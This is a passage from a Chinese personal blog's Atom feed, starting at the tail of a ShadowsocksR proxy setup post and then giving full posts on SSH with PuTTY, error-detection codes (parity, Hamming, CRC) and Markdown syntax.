荐使用的协议，只有auth_sha1_v4和auth_aes128_md5和auth_aes128_sha1，推荐使用的混淆只有plain,http_simple,http_post,tls1.2_ticket_auth不要奇怪为什么推荐plain，因为混淆不总是有效果，要看各地区的策略的，有时候不混淆让其看起来像随机数据更好。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;ssr全名shadowsocksR，是一款代理工具，是shadowsocks的高级版，较之不带r的，带r的增加了一些数据混淆方式，甚至增加了类似Tor的可插拔传输层功能。ss和ssr基于socks5。和其他代理工具基本相同，他们使用特定的中转服务器完成数据传输。客户端在本地会构建一个socks5代理，在访问一些网站的时候，网络流量需要先通过本地代理传到客户端，然后客户端发送到服务端，反之亦然。&lt;br&gt;今天就搁着腆着脸讲一下搭建方法吧。&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机网络" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="工具" scheme="https://blog.pillar.fun/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>putty-ssh（1）</title>
    <link href="https://blog.pillar.fun/2020/01/04/putty-ssh(1)/"/>
    <id>https://blog.pillar.fun/2020/01/04/putty-ssh(1)/</id>
    <published>2020-01-04T10:10:10.000Z</published>
    <updated>2020-05-30T05:46:29.123Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>ssh（secure shell）是应用层上的安全协议，为远程登录会话等网络服务提供安全性的。ssh服务的服务端结合了openssl和openssh的功能，传输和加密功能，linux客户端可以直接使用ssh命令，可以说十分方便，对windows，也可以下载<a href="https://www.mls-software.com/opensshd.html">openssh for windows</a>在powershell或者cmd中使用，但是毕竟只是一个单纯的openssh client，何况标题都叫putty了所以这里介绍windows下的ssh连接客户端putty</p><a id="more"></a><h1 id="putty介绍"><a href="#putty介绍" class="headerlink" title="putty介绍"></a>putty介绍</h1><p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件。较早的版本仅支持Windows平台，在最近的版本中开始支持各类Unix平台，并打算移植至Mac OS X上。看到他的官网有个.org就知道他是非盈利免费的，官网也有源代码开放，在windows各个平台下的兼容性很好，支持ssh1和ssh2，体积小，控制面板功能强大，属实是居家旅行必备好物。</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">putty</a><br>根据自己的系统选msi，他会给你装以下内容<br><img src="/2020/01/04/putty-ssh(1)/12.png" alt><br>主要说putty，因为其他的我也没用过。</p><h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><p>这里你得用一下puttygen.exe，他是用来创建密钥的。<br><img src="/2020/01/04/putty-ssh(1)/33.png" alt><br>可以看到generate和load两个按钮，分别用来generate一个新的key，或者load一个私钥把它转化成putty格式的私钥。下面的参数选项确定了你要生成的key的格式和长度，在你点了生成以后他会根据你的鼠标在空白处的瞎晃悠生成随机序列，然后请你输入密码或者不输，不输其实也可以，但输一下还是稳点，不过你有可能自己忘掉（别问我怎么知道的）。<br><img src="/2020/01/04/putty-ssh(1)/34.png" alt><br>然后你就个以吧公钥和私钥都保存下来了。<br>然后随便找个服务器平台整一台服务器，然后在控制面板里添加ssh public key。</p><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>打开putty连接你的服务器吧</p><ol><li>session（会话）标签下设置你的服务器ip和端口<br><img src="/2020/01/04/putty-ssh(1)/35.png" alt></li><li>terminal(终端) 标签下设置你的终端的各种选项<br><img src="/2020/01/04/putty-ssh(1)/36.png" alt></li><li>window(窗口) 标签下设置你的putty窗口<br><img src="/2020/01/04/putty-ssh(1)/37.png" alt></li><li>connection（连接） 标签下设置连接<br><img src="/2020/01/04/putty-ssh(1)/38.png" alt><br>这里的keepalive是一个ssh的机制，就是每隔多久向服务器发一个空数据，让服务器知道你还在，而不会因为一段时间没收到数据就断开连接，0就是不搞这个机制。<br>在服务器下/etc/ssh/sshd_config中找到ClientAliveInterval参数，他表示如果客户端没有响应，多久之后向客户端发一个包问是否还在连接，在达到了ClientAliveCountMax次没有回应后就断掉连接。<br>（还有一个小技巧，这种config文件里加了注释符的参数值就是default值，看到有一个教程说还要把TCPKeepAlive yes前面的#去掉。。。）<br>在proxy可以设置一下自己的代理，比如你用了ssr并且租了一个国外服务器，直连的话其实有可能敲字延迟，就可以设置代理localhost 1080 socket5<br>ssh子标签里的auth设置连接用的私钥文件的位置<br><img src="/2020/01/04/putty-ssh(1)/39.png" alt></li></ol><h1 id="连！"><a href="#连！" class="headerlink" title="连！"></a>连！</h1><p><img src="/2020/01/04/putty-ssh(1)/310.png" alt="vans"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;ssh（secure shell）是应用层上的安全协议，为远程登录会话等网络服务提供安全性的。ssh服务的服务端结合了openssl和openssh的功能，传输和加密功能，linux客户端可以直接使用ssh命令，可以说十分方便，对windows，也可以下载&lt;a href=&quot;https://www.mls-software.com/opensshd.html&quot;&gt;openssh for windows&lt;/a&gt;在powershell或者cmd中使用，但是毕竟只是一个单纯的openssh client，何况标题都叫putty了所以这里介绍windows下的ssh连接客户端putty&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂项" scheme="https://blog.pillar.fun/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>检错</title>
    <link href="https://blog.pillar.fun/2020/01/02/%E6%A3%80%E9%94%99/"/>
    <id>https://blog.pillar.fun/2020/01/02/%E6%A3%80%E9%94%99/</id>
    <published>2020-01-02T10:24:04.000Z</published>
    <updated>2020-05-30T05:50:13.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>计算机系统中，信息以二进制的方式存储，而检错在计信息传输的过程中十分重要。最近计网考试复习的时候觉得应该简单的总结一下检错手法（水一篇）</p><a id="more"></a><h2 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h2><p>奇偶校验分为奇校验和偶校验，都十分简单，只是在比特串后面加一个校验位，使得整个比特串的每一位异或为0（偶校验）或者1（奇校验）。<br>比如对一个8位长度的比特串10010011，进行奇校验之后就会为10010011 <strong>1</strong>，偶校验就会10010011 <strong>0</strong><br>在传输过程中一般对应编码的一个码元加一个校验位。<br>奇偶校验的局限就是连着错偶数个就傻了。</p><h2 id="海明校验"><a href="#海明校验" class="headerlink" title="海明校验"></a>海明校验</h2><p>海明校验感觉就是进阶的奇偶校验。<br>对于数据位m的数据，加入k位的校验码,它应满足香农第二定理： <strong>n=m+k ≤ 2^k-1</strong><br>m是数据的长度，k是校验码的长度<br>校验码分别插在第2^0、2^1……位<br><img src="/2020/01/02/%E6%A3%80%E9%94%99/u%3D4037051707%2C4151905798%26fm%3D173%26s%3DEF4AA1578FC0494348DD90CE00005070%26w%3D379%26h%3D153%26img.JPEG" alt><br>个人觉得好记一点的说法，第n个校验位校验的是位数的二进制第一位为n的所有位，比如1=1（2），3=11（2），5=（101）2，他们的2^0位都是1，所以第一个校验位都校验他们。最终要求是校验位和他们所校验的所有位的异或为0。<br><strong>指错字</strong> 是将校验位和他们所校验的所有位数异或，如果没有出错的话就应该是0000……如果有一个位出错了，那么校验这个位的所有校验位算出来的指错字都会变成1，比如第3位错了，那么指错位1和指错位2都会变成1，指错字就会变成000011，那么我们就知道第3位出错了。<br>海明的局限也是出错两个以后会出现很多情况，指错字没法指出哪个地方是错的，有时候指错字为0000也不见得没有错误。</p><h2 id="循环冗余校验CRC"><a href="#循环冗余校验CRC" class="headerlink" title="循环冗余校验CRC"></a>循环冗余校验CRC</h2><p>CRC是传输过程中应用比较广泛的一个检错方法。<br>对于一个比特串x，发送方和接收方一起约定一个对应的长度为r的二进制串m，发送方在x后面加上r-1个0然后二进制除m，将得到的结果放在x的后面一起传输<br><img src="/2020/01/02/%E6%A3%80%E9%94%99/1.png" alt><br>接收方只需要将得到的比特串二进制除m，如果没有错误的话余数应该为0<br>CRC可以检测所有的1位、2位、奇数个位错误 、长度小于等于r的突发错误</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;计算机系统中，信息以二进制的方式存储，而检错在计信息传输的过程中十分重要。最近计网考试复习的时候觉得应该简单的总结一下检错手法（水一篇）&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机基础" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Markdown</title>
    <link href="https://blog.pillar.fun/2019/11/14/Markdown/"/>
    <id>https://blog.pillar.fun/2019/11/14/Markdown/</id>
    <published>2019-11-14T15:54:02.000Z</published>
    <updated>2021-03-24T05:00:17.959Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前导"><a href="#前导" class="headerlink" title="前导"></a>前导</h1><p><a href="https://daringfireball.net/projects/markdown/syntax">Markdown</a> 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。一篇文章文从内容到格式，甚至插图，键盘就可以通通搞定了。</p><a id="more"></a><p>大家在github看到的readme.md就是非常好的例子，有兴趣的同学们可以对照着看.md文件的源代码和显示在项目下的readme<br>目前支持Markdown的编辑器很多，甚至很多网站也有Markdown的编辑器。这种用思路的用语法来编辑文档的语言还有LaTeX，有关LaTeX的博文以后再写。</p><h1 id="Markdown的优点"><a href="#Markdown的优点" class="headerlink" title="Markdown的优点"></a>Markdown的优点</h1><ul><li>专注你的文字内容而不是排版样式，安心写作。</li><li>轻松的导出 HTML、PDF 和本身的 .md 文件。</li><li>纯文本内容，兼容所有的文本编辑器与字处理软件。</li><li>随时修改你的文章版本，不必像字处理软件生成若干文件版本导致混乱。</li><li>可读、直观、学习成本低。</li></ul><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ul><li>斜体<br>用一个*号将文字包起来</li></ul><p><code>*这是加粗文字*</code></p><ul><li>粗体<br>用两个*将文字包起来</li></ul><p><code>**这是粗体**</code></p><ul><li>加粗斜体<br>用三个*包起来</li></ul><p><code>***这是加粗斜体***</code></p><ul><li>删除线<br>用~~包起来</li></ul><p><code>~~这是删除了的文字~~</code></p><p><em>这</em> <strong>是</strong> <strong><em>效</em></strong> <del>果(果字好像不是很明显)</del></p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>加&gt;即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;这是引用的文字</span><br><span class="line">&gt;&gt;这是引用引用的文字</span><br><span class="line">&gt;&gt;&gt;这是引用引用引用的文字</span><br><span class="line">&gt;&gt;&gt;&gt;禁止套娃</span><br></pre></td></tr></table></figure><p>理论上可以无限引用</p><blockquote><p>这</p><blockquote><p>是</p><blockquote><p>效</p><blockquote><p>果</p></blockquote></blockquote></blockquote></blockquote><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>用三个或三个以上的-或者*就可以</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------</span><br><span class="line">****</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![显示在下面的文字](图片地址&quot;鼠标悬浮时候显示的内容&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/such-stupid6/such-stupid6.github.io/master/image/timg.jpg" alt="这是示例" title="有一说一，确实"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;悬浮时显示内容&quot;)</span><br></pre></td></tr></table></figure><p><a href="https://cn.bing.com/" title="我就不放百度，略略略">bing</a></p><p>值得一提的是，Markdown一般不支持链接在新页面中打开（不过现在感觉很多平台都做了对应的支持），所以也可以用html语言代替</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;超链接地址&quot; target&#x3D;&quot;_blank&quot;&gt;超链接名&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cn.bing.com&#x2F;&quot; target&#x3D;&quot;_blank&quot;&gt;bing&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://cn.bing.com/" target="_blank">bing</a></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>用-+*中的任何一种都可以。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 内容1</span><br><span class="line">+ 内容2</span><br><span class="line">* 内容3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果</p><ul><li>内容1</li></ul><ul><li>内容2</li></ul><ul><li>内容3</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>用数字加点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.内容1</span><br><span class="line">2.内容2</span><br><span class="line">3.内容3</span><br></pre></td></tr></table></figure><p>效果</p><ol><li>内容1</li><li>内容2</li><li>内容3</li></ol><h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><p>上一级和下一级之间3个空格</p><ul><li>一级无序列表<ul><li>二级无序列表</li></ul></li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><table><thead><tr><th>姓名</th><th>性格</th><th align="right">特点</th></tr></thead><tbody><tr><td>海绵宝宝</td><td>憨憨</td><td align="right">可爱</td></tr><tr><td>派大星</td><td>憨憨</td><td align="right">可爱</td></tr><tr><td>章鱼哥</td><td>憨憨</td><td align="right">可爱</td></tr></tbody></table><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>单行代码用键盘左上角的反引号括起来。<br>多行代码用三个反引号括起来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;单行代码&#96;</span><br><span class="line"></span><br><span class="line">&#96;&#96; &#96;&#96;&#96; &#96;&#96;</span><br><span class="line">多行代码块</span><br><span class="line">&#96;&#96; &#96;&#96;&#96; &#96;&#96;</span><br></pre></td></tr></table></figure><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>跟常用编程语言类型，Markdown使用反斜杠 \ 作为转义符，在Markdown中，如果你希望直接展示「标识符」，那么就可以在标识符前加上反斜杠，告诉解析器，这个符号直接显示为文本，不做解析。以下几种特殊符号需要转义处理：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">&#96;   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  括弧</span><br><span class="line">#   井号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure><h1 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h1><p>别的我不知道，反正我这篇用的<a href="https://www.sublimetext.com/">SublimeText</a>+Markingdown Editing，感觉还成。<br>很多推荐的，建议使用搜索引擎搜关键字”Markdown”和”编辑器”。</p><p>参考<br><a href="https://www.jianshu.com/p/1e402922ee32">https://www.jianshu.com/p/1e402922ee32</a><br><a href="https://www.jianshu.com/p/191d1e21f7ed">https://www.jianshu.com/p/191d1e21f7ed</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前导&quot;&gt;&lt;a href=&quot;#前导&quot; class=&quot;headerlink&quot; title=&quot;前导&quot;&gt;&lt;/a&gt;前导&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://daringfireball.net/projects/markdown/syntax&quot;&gt;Markdown&lt;/a&gt; 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。一篇文章文从内容到格式，甚至插图，键盘就可以通通搞定了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂项" scheme="https://blog.pillar.fun/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
</feed>
